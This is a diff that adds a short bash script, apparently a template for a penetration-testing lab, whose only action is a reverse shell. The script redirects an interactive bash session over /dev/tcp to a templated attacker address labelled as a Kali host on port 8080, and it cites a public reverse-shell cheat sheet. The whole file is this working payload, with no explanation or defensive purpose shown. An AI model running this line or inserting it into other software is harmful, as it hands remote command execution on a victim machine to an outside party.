@@ -1,0 +1,6 @@
+#!/bin/bash
+#
+# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+( bash -i >& /dev/tcp/<%= @kali_ip %>/8080 0>&1 )
+
